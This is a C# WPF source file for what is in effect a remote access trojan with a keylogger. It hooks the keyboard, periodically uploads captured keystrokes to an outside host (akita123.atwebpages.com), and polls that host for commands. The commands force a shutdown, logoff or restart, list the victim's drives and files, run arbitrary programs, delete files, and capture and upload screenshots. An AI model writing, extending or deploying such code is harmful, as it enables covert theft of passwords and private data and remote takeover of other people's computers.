﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Drawing;
using System.Windows.Interop;
using System.Drawing.Imaging;

namespace cmd
{
    /// <summary>
    /// Main.xaml の相互作用ロジック
    /// </summary>
    public partial class Main : Window
    {
        int sessionID, userID;

        ChatWindow chatWindow;
        KeyboardHook keyboardHook;

        DispatcherTimer dispatcherTimer;

        string keys = "";
        int timeUpdateLog = 10;
        int timeCount = 0;

        public Main()
        {
            InitializeComponent();

            userID = getUserID();

            sessionID = createSession();

            chatWindow = new ChatWindow((message) =>
              {
                  sendCommand("mess " + message);
              });
            //chatWindow.Show();

            keyboardHook = new KeyboardHook();
            keyboardHook.Install();
            keyboardHook.KeyDown += (sender, e) =>
            {
                keys += e.Key.ToString();

            };

            dispatcherTimer = new DispatcherTimer();
            dispatcherTimer.Tick += new EventHandler(timer_Tick);
            dispatcherTimer.Interval = new TimeSpan(0, 0, 1);
            dispatcherTimer.Start();
        }

        private void upLog(string log)
        {
            if (log != null && log != "")
            {
                request("http://akita123.atwebpages.com/main.php?type=7&userid=" + userID + "&ssid=" + sessionID + "&log=" + log);
            }
        }

        private int getUserID()
        {
            int userID = 0;

            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\control");

            if (key == null)
            {
                userID = registerUserID();
                RegistryKey control = Registry.CurrentUser.CreateSubKey("Software\\control");
                control.SetValue("id", userID);
            }
            else
            {
                userID = (int)key.GetValue("id");
            }

            return userID;
        }

        private int registerUserID()
        {
            int id = 0;

            while (!int.TryParse(request("http://akita123.atwebpages.com/main.php?type=5"), out id) || id <= 0)
            {
                Thread.Sleep(1000);
            }

            return id;
        }

        private int createSession()
        {
            int id;

            while (!int.TryParse(request("http://akita123.atwebpages.com/main.php?type=1&userid=" + userID), out id))
            {
                Thread.Sleep(1000);
            }

            return id;
        }

        private string[] getCommand()
        {
            string responseFromServer = request("http://akita123.atwebpages.com/main.php?type=3&ssid=" + sessionID + "&touserid=" + userID);

            string[] sep = { "</br>" };

            return responseFromServer.Split(sep, StringSplitOptions.None);
        }

        private void sendCommand(string command)
        {
            string url = String.Format("http://akita123.atwebpages.com/main.php?type=2&cmd='" + command + "'&fromuserid=" + userID + "&touserid=1&ssid=" + sessionID);
            request(url);
        }

        private string request(string url)
        {
            WebRequest request = WebRequest.Create(url);
            request.Credentials = CredentialCache.DefaultCredentials;
            WebResponse response = request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);

            string responseFromServer = reader.ReadToEnd();

            reader.Close();
            response.Close();

            return responseFromServer;
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            string[] cmds = getCommand();

            foreach (string cmd in cmds)
            {
                if (cmd != null && cmd != "")
                {
                    cmdProc(cmd);
                }
            }

            timeCount += dispatcherTimer.Interval.Seconds;
            if (timeCount == timeUpdateLog)
            {
                upLog(keys);
                keys = "";
                timeCount = 0;
            }
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            upLog(keys);
        }

        #region bitmap
        private Stream StreamFromBitmapSource(BitmapSource writeBmp)
        {
            Stream bmp = new MemoryStream();

            BitmapEncoder enc = new BmpBitmapEncoder();
            enc.Frames.Add(BitmapFrame.Create(writeBmp));
            enc.Save(bmp);

            return bmp;
        }

        private BitmapSource CopyScreen()
        {
            using (var screenBmp = new Bitmap(
               (int)SystemParameters.PrimaryScreenWidth,
                (int)SystemParameters.PrimaryScreenHeight,
               System.Drawing.Imaging.PixelFormat.Format32bppArgb))
            {
                using (var bmpGraphics = Graphics.FromImage(screenBmp))
                {
                    bmpGraphics.CopyFromScreen(0, 0, 0, 0, screenBmp.Size);
                    return Imaging.CreateBitmapSourceFromHBitmap(
                        screenBmp.GetHbitmap(),
                        IntPtr.Zero,
                        Int32Rect.Empty,
                        BitmapSizeOptions.FromEmptyOptions());
                }
            }
        }

        public void SaveBitmapSourceToFile(BitmapSource bitmapSource, string filePath)
        {
            using (var fileStream = new FileStream(filePath, FileMode.Create))
            {
                BitmapEncoder encoder = new PngBitmapEncoder();
                encoder.Frames.Add(BitmapFrame.Create(bitmapSource));
                encoder.Save(fileStream);
            }
        }
        #endregion

        private string takeScreen()
        {
            var currentDPI = (int)Registry.GetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop\\WindowMetrics", "AppliedDPI", 96);
            var scale = (float)currentDPI / 96;

            Bitmap screenBitmap;
            Graphics screenGraphics;

            using (screenBitmap = new Bitmap((int)(SystemParameters.PrimaryScreenWidth * scale),
                                      (int)(SystemParameters.PrimaryScreenHeight * scale),
                                      System.Drawing.Imaging.PixelFormat.Format32bppArgb))
            {
                screenGraphics = Graphics.FromImage(screenBitmap);

                screenGraphics.CopyFromScreen(0, 0,
                                        0, 0, screenBitmap.Size, CopyPixelOperation.SourceCopy);
                screenBitmap.Save(@"d:\bit.jpg", ImageFormat.Jpeg);

            }

            return @"d:\bit.jpg";
        }

        private async System.Threading.Tasks.Task uploadFileAsync(string path)
        {
            var hc = new HttpClient();
            var dic = new Dictionary<string, string>();
            dic["FileName"] = "screen.jpg";

            var fileName = path;
            var fileContent = new StreamContent(File.OpenRead(fileName));
            fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment")
            {
                FileName = System.IO.Path.GetFileName(fileName),
                Name = @"userfile[]"
            };

            var content = new MultipartFormDataContent();
            foreach (var param in dic)
            {
                content.Add(new StringContent(param.Value), param.Key);
            }
            content.Add(fileContent);

            var url = "http://akita123.atwebpages.com/test.php";
            var req = await hc.PostAsync(url, content);
            //var html = await req.Content.ReadAsStringAsync();
            //MessageBox.Show(html);
            sendCommand("VIEWSCREEN");
        }

        private async System.Threading.Tasks.Task sendLongCommandAsync(string command)
        {
            string old = @"'";
            string _new = @"\'";

            command = "'" + command.Replace(old, _new) + "'";

            HttpClient httpClient = new HttpClient();

            var data = new Dictionary<string, string>();
            data["cmd"] = command;
            data["fromuserid"] = userID.ToString();
            data["touserid"] = "1";
            data["ssid"] = sessionID.ToString();

            var cont = new FormUrlEncodedContent(data);
            var url = "http://akita123.atwebpages.com/main.php";
            var req = await httpClient.PostAsync(url, cont);
            //var html = await req.Content.ReadAsStringAsync();
            //MessageBox.Show(html);
        }

        private void cmdProc(string cmd)
        {
            try
            {
                if (cmd.ToUpper().StartsWith("MESS"))
                {
                    chatWindow.Show();
                    chatWindow.txtChatBox.AppendText("SERVER: " + cmd.Substring(5) + Environment.NewLine);
                    chatWindow.txtChatBox.ScrollToEnd();
                }
                else if (cmd.ToUpper().StartsWith("SHUTDOWN"))
                {
                    Process.Start(@"C:\Windows\System32\cmd.exe", "/c shutdown -s -f -t 0");
                }
                else if (cmd.ToUpper().StartsWith("LOGOFF"))
                {
                    Process.Start(@"C:\Windows\System32\cmd.exe", "/c shutdown -l -f -t 0");
                }
                else if (cmd.ToUpper().StartsWith("RESTART"))
                {
                    Process.Start(@"C:\Windows\System32\cmd.exe", "/c shutdown -r -f -t 0");
                }
                else if (cmd.ToUpper().StartsWith("FILEEXPLORER"))
                {

                    string result = "";

                    if (cmd.Length > 12)
                    {
                        string path = cmd.Substring(13).Replace(';', '\\');
                        string[] folderPaths = Directory.GetDirectories(path);
                        string[] filePaths = Directory.GetFiles(path);

                        foreach (string folderPath in folderPaths)
                        {
                            result += folderPath + "|";
                        }

                        result += "BEGINFILELIST|";

                        foreach (string filePath in filePaths)
                        {
                            result += filePath + "|";
                        }
                    }
                    else
                    {
                        foreach (string s in Directory.GetLogicalDrives())
                        {
                            DriveInfo drinfo = new DriveInfo(s);

                            if (drinfo.DriveType == DriveType.Fixed)
                            {
                                result += s + "|";
                            }
                        }
                    }

                    result = result.Remove(result.Length - 1);
                    result = result.Replace('\\', ';');

                    sendLongCommandAsync("FILEEXPLORER " + result);
                }
                else if (cmd.ToUpper().StartsWith("RUN"))
                {
                    string path = cmd.Substring(4).Replace(';', '\\');
                    Process.Start(path);
                }
                else if (cmd.ToUpper().StartsWith("DELETE"))
                {
                    string path = cmd.Substring(7).Replace(';', '\\');
                    if (File.Exists(path))
                    {
                        if ((File.GetAttributes(path) & FileAttributes.ReadOnly)
                             == FileAttributes.ReadOnly)
                            File.SetAttributes(path, FileAttributes.Normal);
                        File.Delete(path);
                    }
                    else throw new Exception("FILE NOT EXISTS");
                }
                else if (cmd.ToUpper().StartsWith("VIEWSCREEN"))
                {
                    uploadFileAsync(takeScreen());

                }
            }
            catch (Exception e)
            {
                sendCommand("MBOX " + e.Message);
            }
        }
    }
}